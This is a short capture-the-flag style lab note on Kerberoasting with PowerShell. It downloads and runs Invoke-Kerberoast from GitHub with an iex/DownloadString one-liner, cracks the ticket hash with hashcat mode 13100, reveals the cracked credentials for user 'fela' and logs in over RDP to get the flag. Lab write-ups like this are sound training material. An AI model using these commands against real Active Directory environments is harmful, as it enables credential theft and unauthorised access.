<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Kerberoasting with Powershell</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Kerberoasting with Powershell</h1><br/><p>Lets first get the Powershell Invoke-Kerberoast script.</p><p></p><p><strong>iex​(New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1&#39;) </strong></p><p></p><p>Now lets load this into memory: <strong>Invoke-Kerberoast -OutputFormat hashcat ​ |fl</strong></p><p>You should get a SPN ticket.</p><p></p><p><strong>Note:</strong> The Target machine was unable to connect to github so i copied the raw data from github to ca local kerberos.txt file and hosted it using python from the attacker machine.</p><p></p><p></p><p><img src="images/169-1.png" alt="images/169-1.png" /></p><p></p><p></p><p>Lets use hashcat to bruteforce this password. The type of hash we&#39;re cracking is Kerberos 5 TGS-REP etype 23 and the hashcat code for this is 13100.</p><p></p><p><strong>hashcat -m 13100 -​a 0 hash.txt wordlist --force</strong></p><p></p><p>We gcrack the password. The credentials are</p><p><strong>Username: fela</strong></p><p><strong>Password: rubenF124</strong></p><p></p><p>Now we RDP into the machine with the new user. The flag is on the desktop.</p></div>
</body>
</html>
